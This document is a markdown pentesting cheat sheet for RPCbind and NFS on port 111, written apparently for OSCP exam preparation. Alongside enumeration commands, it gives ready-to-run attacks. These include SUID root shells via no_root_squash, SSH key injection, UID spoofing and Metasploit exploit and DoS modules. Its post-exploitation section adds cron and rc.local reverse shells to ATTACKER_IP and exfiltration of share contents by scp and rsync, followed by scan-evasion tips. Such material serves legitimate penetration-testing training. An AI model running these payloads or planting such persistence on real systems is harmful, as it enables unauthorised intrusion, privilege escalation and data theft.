# Port 111 - RPCbind Enumeration & Exploitation

## Service Information

**Port:** 111/TCP, 111/UDP
**Service:** RPCbind (Portmapper)
**Protocol:** RPC (Remote Procedure Call)
**Common Use:** Maps RPC program numbers to network port numbers (NFS, NIS, etc.)

---

## 1. Basic Enumeration

### 1.1 Nmap Scan

```bash
# Basic scan
nmap -p 111 -sV TARGET_IP

# UDP + TCP scan
nmap -p 111 -sU -sT -sV TARGET_IP

# Detailed RPC enumeration
nmap -p 111 -sV --script rpc-grind TARGET_IP

# All RPC scripts
nmap -p 111 --script rpc-* TARGET_IP

# NFS related enumeration
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount TARGET_IP
```

### 1.2 RPC Info Query

```bash
# rpcinfo - List all RPC services
rpcinfo -p TARGET_IP

# Short output
rpcinfo -s TARGET_IP

# Specific program query
rpcinfo -T tcp TARGET_IP

# Broadcast query (local network)
rpcinfo -b
```

### 1.3 Service Detection

```bash
# Check what's running via RPC
rpcinfo -p TARGET_IP

# Common RPC services:
# - 100000: portmapper
# - 100003: nfs
# - 100005: mountd
# - 100021: nlockmgr
# - 100024: status
# - 100227: nfs_acl
```

---

## 2. NFS Enumeration (via RPCbind)

### 2.1 Show Mounted Shares

```bash
# showmount - List NFS exports
showmount -e TARGET_IP

# List all mount points
showmount -a TARGET_IP

# List directories
showmount -d TARGET_IP

# Nmap alternative
nmap -p 111 --script nfs-showmount TARGET_IP
```

### 2.2 NFS Share Listing

```bash
# List NFS exports
showmount -e TARGET_IP

# Example output:
# Export list for TARGET_IP:
# /home           *
# /var/nfs/general *
# /mnt/backup     192.168.1.0/24

# Mount NFS share
mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/home /tmp/nfs_mount -o nolock

# Access mounted share
cd /tmp/nfs_mount
ls -la
```

### 2.3 NFS Exploitation

```bash
# After mounting NFS share:

# 1. Search for sensitive files
find /tmp/nfs_mount -name "*.conf" 2>/dev/null
find /tmp/nfs_mount -name "*.bak" 2>/dev/null
find /tmp/nfs_mount -name "*_rsa" 2>/dev/null

# 2. Check for SSH keys
find /tmp/nfs_mount -name "id_rsa" 2>/dev/null
find /tmp/nfs_mount -name "authorized_keys" 2>/dev/null

# 3. Look for credentials
grep -r "password" /tmp/nfs_mount 2>/dev/null

# 4. UID/GID Manipulation (if no_root_squash)
# See Section 5.1
```

---

## 3. Metasploit Enumeration

### 3.1 RPC Scanner

```bash
msfconsole
use auxiliary/scanner/misc/sunrpc_portmapper
set RHOSTS TARGET_IP
run
```

### 3.2 NFS Enumeration

```bash
# NFS Share Scanner
use auxiliary/scanner/nfs/nfsmount
set RHOSTS TARGET_IP
run

# NFS Version Detection
use auxiliary/scanner/nfs/nfsver
set RHOSTS TARGET_IP
run
```

---

## 4. Advanced RPC Enumeration

### 4.1 Specific RPC Program Query

```bash
# Query specific RPC program
rpcinfo -T tcp TARGET_IP 100003  # NFS
rpcinfo -T tcp TARGET_IP 100005  # mountd
rpcinfo -T tcp TARGET_IP 100021  # nlockmgr

# Get program version
rpcinfo -T tcp TARGET_IP nfs

# UDP query
rpcinfo -T udp TARGET_IP portmapper
```

### 4.2 RPC Dump (All Services)

```bash
# Full RPC service dump
rpcinfo -p TARGET_IP

# Example output:
#    program vers proto   port  service
#     100000    4   tcp    111  portmapper
#     100000    3   tcp    111  portmapper
#     100003    3   tcp   2049  nfs
#     100005    3   tcp  20048  mountd
#     100021    1   tcp  40623  nlockmgr
```

### 4.3 RPC Service Fingerprinting

```bash
# Nmap RPC grind (detailed enumeration)
nmap -p 111 --script rpc-grind TARGET_IP

# Banner grabbing
nc TARGET_IP 111

# Version detection
nmap -p 111 -sV --version-intensity 9 TARGET_IP
```

---

## 5. NFS Exploitation Techniques

### 5.1 no_root_squash Exploitation

**Vulnerability:** If NFS share has `no_root_squash`, root on client = root on server

```bash
# 1. Mount NFS share
mount -t nfs TARGET_IP:/share /tmp/mount -o nolock

# 2. Check exports (on target if accessible)
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# 3. Exploitation (if no_root_squash):

# As root on attacker:
cd /tmp/mount

# Create SUID shell
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); }' > shell.c
gcc shell.c -o shell
chmod +s shell

# On target (via SSH/other access):
cd /share
./shell  # Root shell!

# Alternative: Copy bash and set SUID
cp /bin/bash /tmp/mount/rootbash
chmod +s /tmp/mount/rootbash

# On target:
./rootbash -p  # Root shell
```

### 5.2 SSH Key Injection

```bash
# If /home is exported:
mount -t nfs TARGET_IP:/home /tmp/mount -o nolock

# Find user directories
ls -la /tmp/mount

# Add your SSH key
mkdir /tmp/mount/user/.ssh 2>/dev/null
echo "YOUR_PUBLIC_KEY" >> /tmp/mount/user/.ssh/authorized_keys
chmod 600 /tmp/mount/user/.ssh/authorized_keys

# SSH as that user
ssh user@TARGET_IP
```

### 5.3 Sensitive File Access

```bash
# Mount share
mount -t nfs TARGET_IP:/var /tmp/mount -o nolock

# Search for sensitive files
find /tmp/mount -name "*.conf" | grep -v "/proc"
find /tmp/mount -name "*.log"
find /tmp/mount -name "*password*"
find /tmp/mount -name "*backup*"

# Common sensitive files:
cat /tmp/mount/www/html/config.php
cat /tmp/mount/backups/*.sql
cat /tmp/mount/log/apache2/access.log
```

---

## 6. UID/GID Spoofing

### 6.1 Create Fake User with Target UID

```bash
# 1. Find UID of files on NFS share
ls -ln /tmp/nfs_mount
# Example: -rw-r--r-- 1 1001 1001 ... file.txt

# 2. Create user with same UID on attacker
sudo useradd -u 1001 fakeuser
sudo su fakeuser

# 3. Now you can read/write as that user
cd /tmp/nfs_mount
cat file.txt  # Success!
```

### 6.2 Root Access via UID 0

```bash
# If no_root_squash is enabled:

# Become root
sudo su

# Access NFS share
cd /tmp/nfs_mount

# Create SUID binary or modify files
# (See Section 5.1)
```

---

## 7. RPC Vulnerabilities

### 7.1 CVE-2017-8779 (rpcbind Remote DoS)

```bash
# Affects rpcbind < 0.2.4
# Remote DoS vulnerability

# Check version
rpcinfo -p TARGET_IP | head

# Metasploit
msfconsole
use auxiliary/dos/rpc/rpcbomb
set RHOSTS TARGET_IP
run
```

### 7.2 Sadmind/IIS Worm (CVE-2001-0717)

```bash
# Old Solaris vulnerability
# Affects Solaris 2.5 - 8

# Metasploit
use exploit/solaris/sunrpc/sadmind_exec
set RHOSTS TARGET_IP
exploit
```

---

## 8. Post-Exploitation

### 8.1 Persistence via NFS

```bash
# After gaining access via NFS:

# 1. Add SSH key (if /home is mounted)
echo "YOUR_KEY" >> /tmp/nfs_mount/user/.ssh/authorized_keys

# 2. Add cron job (if /var/spool/cron is writable)
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /tmp/nfs_mount/spool/cron/crontabs/root

# 3. Modify startup scripts (if /etc is mounted)
echo "nc ATTACKER_IP 4444 -e /bin/bash &" >> /tmp/nfs_mount/etc/rc.local
```

### 8.2 Data Exfiltration

```bash
# Copy sensitive data from NFS share
mount -t nfs TARGET_IP:/share /tmp/mount -o nolock

# Archive and exfiltrate
cd /tmp/mount
tar -czf /tmp/data.tar.gz *
scp /tmp/data.tar.gz user@ATTACKER_IP:/tmp/

# Or direct copy
rsync -avz /tmp/mount/ user@ATTACKER_IP:/tmp/loot/
```

---

## 9. Defense Evasion

### 9.1 Stealth Enumeration

```bash
# Passive enumeration (no direct queries)
# Sniff network for RPC traffic
tcpdump -i eth0 port 111 -w rpc_capture.pcap

# Analyze captured traffic
wireshark rpc_capture.pcap
```

### 9.2 Avoid Detection

```bash
# Use source port manipulation
nmap -p 111 --source-port 53 TARGET_IP

# Slow scan
nmap -p 111 -T1 TARGET_IP

# Fragment packets
nmap -p 111 -f TARGET_IP
```

---

## 10. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| rpcinfo | RPC service enumeration | `rpcinfo -p TARGET_IP` |
| showmount | NFS share enumeration | `showmount -e TARGET_IP` |
| Nmap | Service detection | `nmap -p 111 --script rpc-* TARGET_IP` |
| mount | Mount NFS shares | `mount -t nfs TARGET:/share /mnt` |
| Metasploit | Automated enumeration | `use auxiliary/scanner/nfs/nfsmount` |

---

## 11. NFS Mount Options

```bash
# Common mount options:

# Basic mount
mount -t nfs TARGET:/share /mnt

# No lock (avoid lock issues)
mount -t nfs TARGET:/share /mnt -o nolock

# Specific NFS version
mount -t nfs -o vers=3 TARGET:/share /mnt
mount -t nfs -o vers=4 TARGET:/share /mnt

# Read-only
mount -t nfs TARGET:/share /mnt -o ro

# Soft mount (timeout on failure)
mount -t nfs TARGET:/share /mnt -o soft,timeo=30

# Unmount
umount /mnt
```

---

## 12. Quick Reference

### Quick Enumeration
```bash
# RPC services
rpcinfo -p TARGET_IP

# NFS shares
showmount -e TARGET_IP

# Nmap scan
nmap -p 111 --script rpc-grind,nfs-showmount TARGET_IP
```

### Quick Exploitation
```bash
# Mount NFS
mkdir /tmp/mount
mount -t nfs TARGET_IP:/share /tmp/mount -o nolock

# Search for SSH keys
find /tmp/mount -name "id_rsa" 2>/dev/null

# Add SSH key
echo "YOUR_KEY" >> /tmp/mount/user/.ssh/authorized_keys
```

### no_root_squash Exploit
```bash
# Mount as root
sudo mount -t nfs TARGET:/share /tmp/mount -o nolock
cd /tmp/mount

# Create SUID shell
cp /bin/bash rootbash
chmod +s rootbash

# Execute on target
./rootbash -p
```

---

## 13. OSCP Tips

⚠️ **RPCbind/NFS Priority for OSCP:**
- If port 111 is open, ALWAYS check NFS (port 2049)
- Use `showmount -e` to list shares
- Mount ALL accessible shares
- Look for SSH keys, config files, backups
- Check for `no_root_squash` vulnerability
- Try UID/GID spoofing if access denied
- NFS is often overlooked → Easy wins!

**Common OSCP scenarios:**
1. NFS share with user home directories → SSH keys
2. Backup directories with credentials
3. no_root_squash → Root shell
4. Web application config files on NFS

---

## 14. Troubleshooting

```bash
# Mount fails with "access denied"
# Solution: Try different NFS versions
mount -t nfs -o vers=2 TARGET:/share /mnt
mount -t nfs -o vers=3 TARGET:/share /mnt

# "Permission denied" when accessing files
# Solution: Match UID/GID
sudo useradd -u TARGET_UID fakeuser
sudo su fakeuser

# showmount returns nothing
# Solution: Port 2049 might be filtered, but accessible
nmap -p 2049 TARGET_IP
```

---

## 15. Resources

- **HackTricks NFS**: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
- **HackTricks RPC**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
- **NFS RFC 1813**: https://tools.ietf.org/html/rfc1813
